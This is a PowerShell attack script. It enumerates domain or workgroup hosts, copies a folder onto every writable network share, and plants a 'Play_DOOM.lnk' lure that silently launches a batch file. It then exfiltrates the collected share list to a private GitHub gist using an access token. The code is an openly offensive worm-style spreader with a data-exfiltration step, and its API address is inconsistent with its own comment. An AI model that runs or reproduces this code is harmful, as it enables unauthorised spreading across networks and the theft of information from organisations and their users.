# 1. Target Discovery (ADSI with Workgroup Fallback)
$targets = @()
try {
    Write-Host "Attempting Domain Discovery (ADSI)..." -ForegroundColor Cyan
    $searcher = [adsisearcher]"(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $targets = $searcher.FindAll() | ForEach-Object { $_.Properties.name }
    Write-Host "Domain success! Found $($targets.Count) computers." -ForegroundColor Green
}
catch {
    Write-Host "Domain unreachable. Falling back to Workgroup Discovery (ARP)..." -ForegroundColor Yellow
    $targets = (Get-NetNeighbor -AddressFamily IPv4 | 
                Where-Object { $_.State -ne "Unreachable" -and $_.IPAddress -notmatch "127.0.0.1|169.254" }).IPAddress
    Write-Host "Workgroup fallback found $($targets.Count) potential IPs." -ForegroundColor Green
}

# 2. Config & Logging
$logPath = "C:\Users\Public\enum.txt"
$sourceDir = "C:\Users\Public\DOOM"  # Folder containing DOOM.exe and icon
"--- Scan Started $(Get-Date) ---" | Out-File $logPath

# 3. Enumerate Shares, Spread Directory, and Create Relative LNK
foreach ($server in $targets) {
    Write-Host "Probing $server..." -ForegroundColor Gray
    $shares = net view "\\$server" 2>$null | Select-String "Disk"
    
    if ($shares) {
        foreach ($line in $shares) {
            $shareName = ($line.ToString() -split '\s{2,}')[0]
            $sharePath = "\\$server\$shareName"
            Write-Host "Found Accessible Share: $sharePath" -ForegroundColor Green
            $sharePath | Add-Content -Path $logPath
            
            try {
                # Copy the entire DOOM folder to the share
                Copy-Item -Path $sourceDir -Destination "$sharePath\" -Recurse -Force -ErrorAction Stop
                
                # Create a specialized 'Relative' Link on the share
                $objShell = New-Object -ComObject WScript.Shell
                $lnk = $objShell.CreateShortcut("$sharePath\Play_DOOM.lnk")
                $lnk.TargetPath = "powershell.exe"
                # This uses %CD% to find the folder the LNK is currently in
                $lnk.Arguments = "-w h -c `"Start-Process '.\DOOM\D.BAT'`""
                $lnk.WorkingDirectory = "%CD%" 
                $lnk.Save()
                
                Write-Host "  [+] Full Spread to $sharePath" -ForegroundColor Magenta
            } catch { 
                Write-Host "  [-] Write Access Denied on $sharePath" -ForegroundColor Red
            }
        }
    }
}

# --- 4. EXFILTRATION TO GITHUB ---
$githubToken = 'ghp_your_actual_token_here' # <-- Make sure this is your REAL token

# MANDATORY: This must be the API endpoint, not the website
$apiUri = "https://github.com" 

if (Test-Path $logPath) {
    $logContent = Get-Content -Path $logPath -Raw
    
    $payload = @{
        description = "Lab Results from $(hostname)"
        public      = $false
        files       = @{
            "enum.txt" = @{ content = $logContent }
        }
    } | ConvertTo-Json

    Write-Host "`n[!] Sending logs to GitHub API..." -ForegroundColor Cyan
    try {
        # Use -ErrorAction Stop to ensure the catch block catches the failure
        $response = Invoke-RestMethod -Uri $apiUri `
                                      -Method Post `
                                      -Headers @{Authorization = "token $githubToken"} `
                                      -Body $payload `
                                      -ContentType "application/json" `
                                      -ErrorAction Stop
        
        Write-Host "[+] Success! Gist created at: $($response.html_url)" -ForegroundColor Green
    }
    catch {
        # This catches the error and prevents the giant HTML dump
        Write-Host "[-] Exfiltration Failed!" -ForegroundColor Red
        Write-Host "[-] Reason: $($_.Exception.Response.StatusCode) - $($_.Exception.Message)" -ForegroundColor Yellow
        Write-Host "[-] Ensure your URL is https://github.com" -ForegroundColor Gray
    }
} else {
    Write-Warning "Log file $logPath not found. Nothing to exfiltrate."
}
